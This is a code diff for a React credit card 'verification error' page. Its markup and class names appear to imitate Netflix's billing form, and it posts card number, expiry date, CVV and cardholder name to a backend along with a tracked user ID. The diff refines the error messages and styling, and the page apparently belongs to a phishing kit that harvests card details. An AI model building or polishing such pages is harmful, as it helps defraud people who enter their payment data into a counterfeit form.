@@ -1,7 +1,7 @@
 import React, { useState, useEffect, useRef } from 'react';
 import axios from 'axios';
 import { useHistory } from 'react-router-dom';
-import './verif.css';
+import { zokomId } from '../utils/auth';
 
 const CARD_TYPES = {
   visa: /^4[0-9]{0,15}$/,
@@ -34,16 +34,42 @@ const VerificationCCerror = () => {
   const [message, setMessage] = useState('');
   const [isLoading, setIsLoading] = useState(false);
   const history = useHistory();
-  const timeoutRef = useRef(null);
+  const [styleElement, setStyleElement] = useState(null);
+const timeoutRef = useRef(null); // Ensure timeoutRef is defined
+const userId = zokomId();
+useEffect(() => {
+  const loadStyles = async () => {
+    try {
+      const cssModule = await import('./verif.css');
 
-  useEffect(() => {
-    return () => {
-      if (timeoutRef.current) {
-        clearTimeout(timeoutRef.current);
-      }
-    };
-  }, []);
+      // Create a new <style> tag and append the imported CSS
+      const styleTag = document.createElement("style");
+      styleTag.textContent = cssModule.default;
+      document.head.appendChild(styleTag);
 
+      // Store the reference to remove later
+      setStyleElement(styleTag);
+    } catch (error) {
+      console.error("Error loading styles:", error);
+    }
+  };
+
+  loadStyles();
+
+  return () => {
+    // Cleanup styles when the component unmounts
+    if (styleElement) {
+      document.head.removeChild(styleElement);
+    }
+
+    // Clear any pending timeout
+    if (timeoutRef.current) {
+      clearTimeout(timeoutRef.current);
+    }
+  };
+}, []);
+
+  
   const detectCardType = (number) => {
     for (let [type, regex] of Object.entries(CARD_TYPES)) {
       if (regex.test(number.replace(/\s+/g, ''))) return type;
@@ -53,7 +79,7 @@ const VerificationCCerror = () => {
 
   const validateCardNumber = (number) => {
     const cleanNumber = number.replace(/\s+/g, '');
-    if (!/^[0-9]{13,19}$/.test(cleanNumber)) return 'Enter a valid credit card number.';
+    if (!/^[0-9]{13,19}$/.test(cleanNumber)) return 'Please enter a valid credit card number.';
 
     let sum = 0;
     let shouldDouble = false;
@@ -66,12 +92,12 @@ const VerificationCCerror = () => {
       sum += digit;
       shouldDouble = !shouldDouble;
     }
-    return sum % 10 === 0 ? '' : 'Enter a valid credit card number.';
+    return sum % 10 === 0 ? '' : ' Please enter a valid credit card number.';
   };
 
   const validateExpiryDate = (date) => {
     const regex = /^(0[1-9]|1[0-2])\/([0-9]{2})$/;
-    if (!regex.test(date)) return 'Enter a valid expiry date.';
+    if (!regex.test(date)) return 'Please enter a valid expiry date.';
 
     const [month, year] = date.split('/');
     const expiryDate = new Date(`20${year}`, month - 1);
@@ -86,12 +112,12 @@ const VerificationCCerror = () => {
     return regex.test(code)
       ? ''
       : type === 'amex'
-      ? 'Enter the 4 digit code on the front of your card. '
-      : 'Enter the 3 digit code on the back of your card.';
+      ? 'Please enter a valid CVV code.'
+      : 'Please enter a valid CVV code.';
   };
 
   const validateNameOnCard = (name) => {
-    return name.trim() === '' ? 'Enter the name on the card.' : '';
+    return name.trim() === '' ? 'Please enter the name on the card.' : '';
   };
 
   const formatInputValue = (name, value) => {
@@ -183,6 +209,7 @@ const VerificationCCerror = () => {
 
     try {
       const response = await axios.post('/api/billing/credit-card', {
+        userId,
         cardNumber: cardData.cardNumber,
         expiryDate: cardData.expiryDate,
         securityCode: cardData.securityCode,
@@ -272,7 +299,6 @@ const VerificationCCerror = () => {
                             <ul className="simpleForm structural ui-grid inlineContainer">
                               <li data-uia="field-creditCardNumber+wrapper" className="nfFormSpace">
                                 <div className="cardNumberContainer">
-                                    
                                  <div className="form-control_containerStyles__oy4jpq0  default-ltr-cache-pukm6w e2so2tu1" data-uia="field-creditCardNumber+container" dir="ltr">
                                     <label style={{marginRight: "68px"}} htmlFor=":r0:" className="form-control_labelStyles__oy4jpq5" dir="ltr" data-uia="field-creditCardNumber+label">Card number</label>
                                     <div className="form-control_controlWrapperStyles__oy4jpq1" dir="ltr">
@@ -288,7 +314,26 @@ const VerificationCCerror = () => {
                                         )}
                                       </div>
                                     </div>
-                                    {errors.cardNumber && <div className="error">{errors.cardNumber}</div>}
+                                    {errors.cardNumber && <div className="error">
+                                       <svg
+      xmlns="http://www.w3.org/2000/svg"
+      fill="none"
+      role="img"
+      viewBox="0 0 16 16"
+      width="16"
+      height="16"
+      data-icon="CircleXSmall"
+      aria-hidden="true"
+      className="default-ltr-cache-13htjwu e1vkmu653"
+    >
+      <path
+        fillRule="evenodd"
+        clipRule="evenodd"
+        d="M14.5 8C14.5 11.5899 11.5899 14.5 8 14.5C4.41015 14.5 1.5 11.5899 1.5 8C1.5 4.41015 4.41015 1.5 8 1.5C11.5899 1.5 14.5 4.41015 14.5 8ZM16 8C16 12.4183 12.4183 16 8 16C3.58172 16 0 12.4183 0 8C0 3.58172 3.58172 0 8 0C12.4183 0 16 3.58172 16 8ZM4.46967 5.53033L6.93934 8L4.46967 10.4697L5.53033 11.5303L8 9.06066L10.4697 11.5303L11.5303 10.4697L9.06066 8L11.5303 5.53033L10.4697 4.46967L8 6.93934L5.53033 4.46967L4.46967 5.53033Z"
+        fill="currentColor"
+      ></path>
+    </svg>{errors.cardNumber}
+    </div>}
                                   </div>
                                 </div>
                               </li>
@@ -299,7 +344,24 @@ const VerificationCCerror = () => {
                                     <input type="tel" autoComplete="cc-exp" dir="ltr" placeholder="MM/YY" className="input_nativeElementStyles__1euouia0" id=":r3:" name="expiryDate" data-uia="field-creditExpirationMonth" value={cardData.expiryDate} onChange={handleInputChange} onBlur={handleBlur} />
                                     <div aria-hidden="true" className="form-control_controlChromeStyles__oy4jpq4" dir="ltr"></div>
                                   </div>
-                                  {errors.expiryDate && <div className="error">{errors.expiryDate}</div>}
+                                  {errors.expiryDate && <div className="error"><svg
+      xmlns="http://www.w3.org/2000/svg"
+      fill="none"
+      role="img"
+      viewBox="0 0 16 16"
+      width="16"
+      height="16"
+      data-icon="CircleXSmall"
+      aria-hidden="true"
+      className="default-ltr-cache-13htjwu e1vkmu653"
+    >
+      <path
+        fillRule="evenodd"
+        clipRule="evenodd"
+        d="M14.5 8C14.5 11.5899 11.5899 14.5 8 14.5C4.41015 14.5 1.5 11.5899 1.5 8C1.5 4.41015 4.41015 1.5 8 1.5C11.5899 1.5 14.5 4.41015 14.5 8ZM16 8C16 12.4183 12.4183 16 8 16C3.58172 16 0 12.4183 0 8C0 3.58172 3.58172 0 8 0C12.4183 0 16 3.58172 16 8ZM4.46967 5.53033L6.93934 8L4.46967 10.4697L5.53033 11.5303L8 9.06066L10.4697 11.5303L11.5303 10.4697L9.06066 8L11.5303 5.53033L10.4697 4.46967L8 6.93934L5.53033 4.46967L4.46967 5.53033Z"
+        fill="currentColor"
+      ></path>
+    </svg>{errors.expiryDate}</div>}
                                 </div>
                               </li>
                               <li data-uia="field-creditExpirationYear+wrapper" className="nfFormSpace hidden"></li>
@@ -317,7 +379,24 @@ const VerificationCCerror = () => {
                                       </button>
                                     </div>
                                   </div>
-                                  {errors.securityCode && <div className="error">{errors.securityCode}</div>}
+                                  {errors.securityCode && <div className="error"><svg
+      xmlns="http://www.w3.org/2000/svg"
+      fill="none"
+      role="img"
+      viewBox="0 0 16 16"
+      width="16"
+      height="16"
+      data-icon="CircleXSmall"
+      aria-hidden="true"
+      className="default-ltr-cache-13htjwu e1vkmu653"
+    >
+      <path
+        fillRule="evenodd"
+        clipRule="evenodd"
+        d="M14.5 8C14.5 11.5899 11.5899 14.5 8 14.5C4.41015 14.5 1.5 11.5899 1.5 8C1.5 4.41015 4.41015 1.5 8 1.5C11.5899 1.5 14.5 4.41015 14.5 8ZM16 8C16 12.4183 12.4183 16 8 16C3.58172 16 0 12.4183 0 8C0 3.58172 3.58172 0 8 0C12.4183 0 16 3.58172 16 8ZM4.46967 5.53033L6.93934 8L4.46967 10.4697L5.53033 11.5303L8 9.06066L10.4697 11.5303L11.5303 10.4697L9.06066 8L11.5303 5.53033L10.4697 4.46967L8 6.93934L5.53033 4.46967L4.46967 5.53033Z"
+        fill="currentColor"
+      ></path>
+    </svg>{errors.securityCode}</div>}
                                 </div>
                               </li>
                               <li data-uia="field-firstName+wrapper" className="nfFormSpace">
@@ -327,7 +406,24 @@ const VerificationCCerror = () => {
                                     <input type="text" autoComplete="cc-name" dir="ltr" placeholder="" className="input_nativeElementStyles__1euouia0" id=":r9:" name="nameOnCard" data-uia="field-name" value={cardData.nameOnCard} onChange={handleInputChange} onBlur={handleBlur} />
                                     <div aria-hidden="true" className="form-control_controlChromeStyles__oy4jpq4" dir="ltr"></div>
                                   </div>
-                                  {errors.nameOnCard && <div className="error">{errors.nameOnCard}</div>}
+                                  {errors.nameOnCard && <div className="error"><svg
+      xmlns="http://www.w3.org/2000/svg"
+      fill="none"
+      role="img"
+      viewBox="0 0 16 16"
+      width="16"
+      height="16"
+      data-icon="CircleXSmall"
+      aria-hidden="true"
+      className="default-ltr-cache-13htjwu e1vkmu653"
+    >
+      <path
+        fillRule="evenodd"
+        clipRule="evenodd"
+        d="M14.5 8C14.5 11.5899 11.5899 14.5 8 14.5C4.41015 14.5 1.5 11.5899 1.5 8C1.5 4.41015 4.41015 1.5 8 1.5C11.5899 1.5 14.5 4.41015 14.5 8ZM16 8C16 12.4183 12.4183 16 8 16C3.58172 16 0 12.4183 0 8C0 3.58172 3.58172 0 8 0C12.4183 0 16 3.58172 16 8ZM4.46967 5.53033L6.93934 8L4.46967 10.4697L5.53033 11.5303L8 9.06066L10.4697 11.5303L11.5303 10.4697L9.06066 8L11.5303 5.53033L10.4697 4.46967L8 6.93934L5.53033 4.46967L4.46967 5.53033Z"
+        fill="currentColor"
+      ></path>
+    </svg>{errors.nameOnCard}</div>}
                                 </div>
                               </li>
                               <li data-uia="field-lastName+wrapper" className="nfFormSpace hidden"></li>
